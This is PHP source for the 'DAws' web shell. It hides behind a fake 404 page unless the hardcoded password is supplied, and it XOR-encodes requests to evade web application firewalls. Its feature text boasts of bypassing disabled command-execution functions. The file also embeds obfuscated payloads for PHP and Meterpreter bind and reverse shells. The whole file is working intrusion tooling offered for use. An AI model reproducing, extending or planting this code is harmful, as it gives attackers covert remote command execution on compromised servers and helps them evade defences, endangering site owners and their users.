<?php
#DAws
#Credits:
#	dotcppfile & Aces

session_start();
ob_start();

$notfound = "
<!DOCTYPE HTML PUBLIC '-//IETF//DTD HTML 2.0//EN'>
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL ".$_SERVER['PHP_SELF']." was not found on this server.</p>
<hr>
<address>at ".$_SERVER['SERVER_ADDR']." Port 80</address>
</body></html>";

if(isset($_POST['pass']))
{
	if($_POST['pass'] == "DAws")
	{
		$_SESSION['login']=true;
	}
	else
	{
		session_destroy();
		header("HTTP/1.1 404 Not Found");
		echo "$notfound";
		exit;
	}
}
else if(isset($_SESSION['login']))
{
	if ($_SESSION['login'] != true)
	{
		session_destroy();
		header("HTTP/1.1 404 Not Found");
		echo "$notfound";
		exit;
	}
}
else
{
	session_destroy();
	header("HTTP/1.1 404 Not Found");
	echo "$notfound";
	exit;
}

if (isset($_GET["logout"]))
{
	if ($_GET["logout"] == "true")
	{
		session_destroy();
		header("Location: ".$_SERVER['PHP_SELF']);
	}
}

function generateRandomString($length = 10)
{
	$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
	$charactersLength = strlen($characters);
	$randomString = '';
	for ($i = 0; $i < $length; $i++)
	{
		$randomString .= $characters[rand(0, $charactersLength - 1)];
	}
	return $randomString;
}

if (!isset($_SESSION['key']))
{
	$_SESSION['key'] = generateRandomString();
}

function xor_this($string)
{
	$key = $_SESSION['key'];
	$outText = '';

 	for($i=0;$i<strlen($string);)
 	{
		for($j=0;($j<strlen($key) && $i<strlen($string));$j++,$i++)
		{
			$outText .= $string{$i} ^ $key{$j};
		}
	}
	return base64_encode($outText);
}

function unxor_this($string)
{
	return base64_decode(xor_this(base64_decode($string)));
}

function sh3ll_this($string)
{
	$key = "dotcppfile";
	$outText = '';

 	for($i=0;$i<strlen($string);)
 	{
		for($j=0;($j<strlen($key) && $i<strlen($string));$j++,$i++)
		{
			$outText .= $string{$i} ^ $key{$j};
		}
	}
	return base64_encode($outText);
}

function unsh3ll_this($string)
{
	return base64_decode(sh3ll_this(base64_decode($string)));
}

?>

<!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Strict//EN'
'http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd'>
<html xmlns='http://www.w3.org/1999/xhtml' xml:lang='en' lang='en'>
<head>
<meta http-equiv='content-type' content='text/html; charset=utf-8'/>
<title>DAws</title>
<style type="text/css">
	html {
		overflow-y: scroll; 
	}
	body {
		font-family: Arial, sans-serif; 
		line-height: 1.4;
		font-size: 15px;
		background: #242625;
		color: #F9F7ED;
		margin: 0;
		padding: 0;
		font-size: 85%;
	}
	form {
		display: inline-block;
	}
	textarea {
		width: 750px;
		height: 250px
	}
	a { 
		color: #B3E1EF; 
		text-decoration: none;
	}
	a:hover { 
		text-decoration: underline; 
	}
	h1 {
		margin: 0;
		font-weight: 100;
	}
	h1 a { 
		text-decoration: none; 
		color: #B3E1EF;
	}
	h1 a:hover { 
		text-decoration: none; 
		border-bottom: 1px solid #B3E1EF; 
		color: #B3E1EF; 
	}
	h2 a { 
		text-decoration: none; 
		color: #B3E1EF;
	}
	h2 a:hover { 
		text-decoration: none; 
		border-bottom: 1px solid #B3E1EF; 
		color: #B3E1EF; 
	}
	h3 {
		margin-top: 10px;
		margin-bottom: 10px;
	}
	.flat-table {
		margin-bottom: 20px;
		border-collapse:collapse;
		font-family: 'Lato', Calibri, Arial, sans-serif;
		border: 1px solid black;
		border-radius: 3px;
		-webkit-border-radius: 3px;
		-moz-bordesr-radius: 3px;
	}
	.flat-table tr {
		-webkit-transition: background 0.3s, box-shadow 0.3s;
		-moz-transition: background 0.3s, box-shadow 0.3s;
		transition: background 0.3s, box-shadow 0.3s;
	}
	.flat-table th {
		background: #2C2F2D;
		height: 30px;
		line-height: 30px;
		font-weight: 600;
		font-size: 13px;
		margin: 0 0 0 0; 
		padding: 0 0 0 10px; 
		color: #F9F7ED;
		border: 1px solid black;
	}
	.flat-table td {
		height: 30px;
		overflow:hidden;
		border: 1px solid black;
	}
	.flat-table th, .flat-table td {
		box-shadow: inset 0 -1px rgba(0,0,0,0.25), inset 0 1px rgba(0,0,0,0.25);
	}
	.flat-table-1 {
		text-align: center;
		background: #3F3F3F;
		margin-top: 10px;
		margin-bottom: 10px;
		width: 1020px;
	}
	.flat-table-2 {
		text-align: center;
		background: #3F3F3F;
		margin-top: 10px;
		margin-bottom: 10px;
		width: 505px;
		height: 335px;
	}
	.flat-table-3 {
		text-align: center;
		background: #3F3F3F;
		margin-top: 10px;
		margin-bottom: 10px;
		width: 750px;
		height: 100px;
	}
	.flat-table-1 tr:hover, .flat-table-2 tr:hover, .flat-table-3 tr:hover{
		background: rgba(0,0,0,0.19);
	}
	.danger {
		color: red;
	}
	.success {
		color: green;
	}
	.tabs {
		position: fixed;
		top: 0;
	}
	.fButton {
		position: fixed;
		top: 0;
		right: 0;
	}
</style>

<?php

echo "
<script>

function xor_str(string)
{
	var key = \"".$_SESSION['key']."\"
	var the_res = \"\";
	for(i=0; i<string.length;)
	{
		for(j=0; (j<key.length && i<string.length); ++j,++i)
		{
			the_res+=String.fromCharCode(string.charCodeAt(i)^key.charCodeAt(j));
		}
	}
	return btoa(the_res);
}

function xorencr(form, command) 
{
	if (command.value == '')
	{
		alert(\"You didn't input a command mofo\");
		return false;
	}

	form.command.value = xor_str(command.value);
	form.submit();
	return true;
}

function xorencr2(form, language, command) 
{
	if (command.value == '')
	{
		alert(\"You didn't input a command mofo\");
		return false;
	}

	form.eval.value = xor_str(command.value);
	form.submit();
	return true;
}

function xorencr3(form, original_name, new_name) 
{
	if ((original_name.value == '') || (new_name.value == ''))
	{
		alert(\"You didn't input a command mofo\");
		return false;
	}

	form.original_name.value = btoa(original_name.value);	
	form.new_name.value = xor_str(new_name.value);	
	form.submit();
	return true;
}

function xorencr4(form, dir) 
{
	if (dir.value == '')
	{
		alert(\"You didn't input a command mofo\");
		return false;
	}

	form.dir.value = xor_str(dir.value);	
	form.submit();
	return true;
}

function xorencr5(form, content) 
{
	if (content.value == '')
	{
		alert(\"You didn't input a command mofo\");
		return false;
	}

	form.content.value = xor_str(content.value);	
	form.submit();
	return true;
}

function showDiv()
{
	if (document.getElementById(\"features\").style.display == \"block\") 
	{
    		document.getElementById(\"features\").style.display = \"none\";
   	} 
	else 
	{
    		document.getElementById(\"features\").style.display = \"block\";
	}
}
</script>
";
?>
</head>

<body>
<div id="features" style='display:none'>>
<ul>
	<il><font color=#B3E1EF size=5>About</font></il>
	<ul>
		<li>There's multiple things that makes DAws better than every Web Shell out there:</li>
		<ol>
			<li>Bypasses Disablers; DAws isn't just about using a particular function to get the job done, it uses up to 6 functions if needed, for example, if `shell_exec` was disabled it would automatically use `exec` or `passthru` or `system` or `popen` or `proc_open` instead, same for Downloading a File from a Link, if `Curl` was disabled then `file_get_content` is used instead and this Feature is widely used in every section and fucntion of the shell.</li>
			<li>Automatic Random Encoding; DAws randomly encodes automatically most of your GET and POST data using Java Script or PHP which will allow your shell to Bypass pretty much every WAF out there.</li>
			<li>Advanced File Manager; DAws's File Manager contains everything a File Manager needs and even more but the main Feature is that everything is dynamically printed; the permissions of every File and Folder are checked, now, the functions that can be used will be available based on these permissions, this will save time and make life much easier.</li>
			<li>Tools: DAws holds bunch of useful tools such as "bpscan" which can identify useable and unblocked ports on the server within few minutes which can later on allow you to go for a bind shell for example.</li>
			<li>Everything that can't be used at all will be simply removed so Users do not have to waste their time. We're for example mentioning the execution of c++ scripts when there's no c++ compilers on the server(DAws would have checked for multiple compilers in the first place) in this case, the function would be automatically removed and the User would know.</li>
			<li>Supports Windows and Linux.</li>
			<li>Openned Source.</li>
		</ol>
		DAws was mainly created by dotcppfile and Aces because everyone was getting sick of all these Shells that were easily stopped by WAFs or Disablers or whatever. Something like DAws is really hard to stop because there's always a substitute for everything and the user doens't have to worry about it at all.
	</ul>
	
	<br><il><font color=#B3E1EF size=5>Extra Info</font></il>
	<ul>
		<li>Download from Link - Methods:</li>
		<ul>
			<li>PHP Curl</li>
			<li>File_put_content</li>
		</ul>
		<li>Zip - Methods:</li>
		<ul>
			<li>Linux:</li>	
			<ol>
				<li>Zip</li>
			</ol>
			<li>Windows:</li>
			<ol>
				<li>Vbs Script</li>
			</ol>
		</ul>
		<li>Shells and Tools:</li>
		<ul>
			<li>Extra:</li>
			<ol>
				<li>`nohup`, if installed, is automatically used for background processing.</li>
			</ol>
		</ul>
	</ul>
</ul>
</div>

<center>

<?php
	echo "<br><br><h1><a href=".$_SERVER['PHP_SELF'].">DAws</a></h1>";

$phpbindshell = "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";

$phpreverseshell = "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";

$meterpreterbindshell = "blNLExgAbGNPRTAHEUMAER8FAwQATxwCHhQKDB5FCxkREQcCDx0JFkQbHAoDUBEAGA1EGxwGUBMJGx4ABxtULyA/ND1MBwEJGxEVUBUMAgENARNpU1APHUwRC08ACxVQEAAPEQ0CWmlUAAkbGEVZT0BXRERdY0gMFA4QBwJQW0lOVUpfWlNeQERSZm8NCVRLGQM5Cg0JCA4WDxVYQRoYFwEOGTwDHwUCCRE7HBERBhUUTkVMRBR+alQDFB8fCgcEVF5QAxIbCQQJMAcMExsDHTMWAR0CBgJYRB0PFV5AWxhUGRYICAEWEk4YVAAJGxgYRkZPaXkZAElEREAcBhUDHwUCRUUfTxAKFVhPUkwYbmZQEFBNRhoYFwEOGTwDHwUCCRE7DhcAFQASQUgWFhkHDBMbSklBVE1UfmoWEwoGHwBMSwcRBgMJCgdMX2V9RwMvEhAcAERSVEQDBBQMDQhDVH4eUBUKGgkMAk9cCgMvBQgACQUNGAZYVxUGDw4BGysAAhUHHQk6CAYHFxUeQUBFRR9lfUcDAhAaAwYPT0lDAx8FAgkROwwGBhEEAzYADBcbEQ1YMSA2JSshO1hDIz8lIjM2MD0xIj1cRjojKTs7NzNZS2xgBQNER1VHAhUVQEweRAsdBlhZXUkRb21LB0NNUBUGDw4BGysCExMDGRhNQBwGFQMfBQJFXm5mBwwTGwMdMwYIAAcGWFQVGxoWCwwfSkt6b00fOhAWBAZQTUZOHwoHBBEXV0tsFEwACBwRChZQTgAfOgcOGA8REgoMREIXABcIFQQ5Ch4ABRsRRFlZRhJmbEAcBhUDHwUCTFhEHBsAGxUSNg8XAQ4ABlgxIDYlKyE7WEMjPyUiMzYwPTEiPVxGOiMpOzs3M1lLbGBIFwEcVF5QAwkKBwAQMBYKHhROTR8XEhwbABtcRk0FFQULEBFcUEIZAxcQRk9peRkASUREQB0REFlQHUkIDAFHXVhQDWxgSBZEUlQQHxMNDBg6BQwXBgAETk0fFxIcGwAbWV1jZRYLDB8GBC8FBQMWAUdQEAIGFQYPDk1UfmpUAzkdFRUBT0lDVwMJCgcAEEhPaQ1QAwUfAEQUfmoUGQNBRV5uEn4KFlBOSEgWTU8PQxQZA0FFXkQSfmkDBw8dDw1ER1AQLwQfGQlMRBR+ABEDA0lLFhAdEQIdV1xJSAkBAVReUBYUDA0BTEsHT1BET1JMBxYKFQhLegUIHwBESAcMExsDHUtfREsYBh5QW0kfCgcEERcvAgMICE1AHFhDRFldSQ4XAQ4fWHoNbAAKRUxOUA8VHk9JF29tTFQ0FVAACAUJAQtUDB5QEgEJRQkOHQ1QAwkKBwAQQVRDJBgDGwlCF08aDFAHBxBMEQtPFwweBA8HGQBITwcMenlFSQ4EDQN+ahQZA0FFXm4SfkcRUFtJGQsUDhcIWFIoBQkLRkNURxwVCEBXb0ADEQ1QTUZNDT5DAxENVy1dY2ZBBk9JQ1dXXWMbDQ0DEUNYAxIbAAAKR1ABWVBaSUgJAQFdQwt6bxobDBAMHENYVBU2GBwUCl1DC3pvCg0WAU9TEAQCAwgBQl5PUAFQXltJChcBDhBLVANKSUgJAQFZEAQCCgwCTUANXUpLUAQbCQQPVH5qExEVDExCFwAXCBUEQVNMQQZPWl5QAwkKBwAQMAYGERROTR9JREsYBh5dFR0eCQEBXEcSWU9STAcWChUIS3pvFGYYbmVXQyMVEkkZFUQbHAZQAwkKBwAQTxIMAlASAQlFCQ4dDVADEggLAEQbG0MFAwNHZkEjIzshMTw1MksIFwgHDBMbQTRMWERLB1h6VCElIyclIyc4Vx0VDh8KBwQrFwkAA04xRVlPUBAvBB8ZCV5uCgICHFhCC0VebgsdBlhZXWNTW24=";

$meterpreterreverseshell = "blNLExgAbGMJFxYABjwCFRYGHhENARNLQFldY09FMAcRQwARHwUDBABPHAIeFAoMHkULGRERBwIPHQkWRBscCgNQEQAYDUQbHAZQEwkbHgAHG1QvOD81PUwHAQkbERVQFQwCAQ0BE2lTUA8dTBELTwALFVAQAA8RDQJaaVQZFklRRUNeTVFeQVBRQlRKXkRXV0tsTRwKFhtUXlBEUl1YXm5LHRMWUFtJLSM7JjomJEtsYwUDREcyIjwjI0lNWFlPBxcCAAkaREENH1hDUkpEQEVFH2V9QFAZFh9aRRYKBRYZAgMaTAcWDhcIFQQVSQ0XCxoaB1AEDgxMBAALBgYDA2xgSAwUT0lDUitER0xBDR9UTVItRFJmbEAGBAVQTUYoKjotITE3RktsFGZvDQlUS1hUAElRRUMcABEVEQs2HwoHBBEXLxMKAAkLEEhdQ1ZWRgAfOgcOGA8REgoMREECRl1DC3pvTR9FWU9QBVhSEgocX0tAD0cZABtTF0EUAAYXDVJPUmZsQBwrFwkAA0lRRUMcABEVEQtOV28ZTxEPAxUPD0xNTEsSQ01QQQ8fCgcEGxMVHkFATENCTx0QLxMHBQAEBgMRS1QWT0BMHm5mUBBQTUZNCk1ABgRPUFQWBh4RTVR+alQDOR0VFQFPSUNXAxIbCQQJSE9pDVADBR8ADQlUS1hUAElRRUMcGwAbFRI2DxcBDgAGV1lGT0pFDRwrABEcCggOCQFHUAVZWUYSZmxAHFReUFQAQUgMFAlYQyM/JSIzNjA9MSI9XEY6Iyk7OzczWUtsYEgXARxUXlAwFQYPDgEbKwAfHggMDxFMSwdPUFQPGUBFQB8bEQRZXWNlDAJPXEJUAgMaRUUfTxAKFVhPUkwYbmZQEC8EHxkJRVlPUxAfEw0MGEJfZQlDFRwVDEwebmYQChVYQQcDRRcAFwgVBEYPGQsHHFNKS3obYwUDREdVRwNZRhJMAQ0KXEQeH0YaAwYPCgBEWUtGFGZvFxgdFxMYRkFIFjsbDRMVWUYSTG8HDgcGUFcVHR4ABQJTWVBUCgwCRVlPEhEVEQJBSBZIT0BKS1AEGwkED1R+ABEDA0lLFgsMHwYEV1xJSAkBAVReUAMJCgcAEDAGBhEUTk0fSURbXVhQEhQMDQ5fZQlpGRZGQU1BCAoaSlALbGBPRTMKVAURGQoMCEULAVQXGBVGBA0MCk8HDBMbAx1CRUQ7HAYCFUEaTAsLTwMCCVASBkwGCwEACh4FA0VMFgtlfUBQEgcAAG9tCx0GWFldYxFvQA5UXlAFCBkNBg9HVi0cFQhLQEVAAxENWUtsTQAACk9JQ1QRPU4AAApIKVh6ekILTFhESFNYegcOAAAAREcHFwIcAwdEQQZGVF9QVAoMAkxEFH5qAwcPHQ8NREdQEC8EHxkJTEQUVGl5EwcaCUVDHAARFRELTlZFQA1UTU1QABsJBABHUBBcUEIFCQtJHAARHBUIQUgHTUZPQxICAwgHXm5mFwIDFUZOHwoHBBEXV0pGTQ5FSlJUEB8TDQwYOhYKFQdYVBVFTEEIChpOAwQUBQkLTEsWSllLRgseAAUET2l5DWwUZm9HTycGBFATGUwRDApUEB8TDQwYRQIABkMEGANJAQQNAVQQBBEBDEwRC08BEBVebE0rKSstNS8jK0EEHwIXABcIVy1GVExBF1R+Rzc8KSstKTc0Uw4DFxUGDw47Gw0TFVc7SVFFQBwrFwkAA1JmABIOGEtUEk9SZgENClxKS3pZV2Y=";

